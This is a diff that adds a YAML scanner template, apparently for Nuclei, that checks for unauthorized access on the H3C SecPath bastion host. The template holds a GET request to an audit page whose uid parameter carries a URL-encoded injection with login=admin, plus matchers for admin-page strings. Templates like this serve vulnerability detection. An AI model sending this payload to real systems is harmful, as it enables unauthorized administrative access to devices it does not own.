@@ -1,0 +1,23 @@
+id: yaml-poc-h3c-secpath_bastion_host-unauthorized_access-CT-158285
+info:
+  name: Yaml Poc H3C Secpath_Bastion_Host Unauthorized_Access Ct 158285
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-h3c-secpath_bastion_host-unauthorized_access-CT-158285'
+  tags: unauth
+  reference: []
+http:
+- method: GET
+  path:
+  - /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - admin
+    - 错误的id
+    - 审计管理员
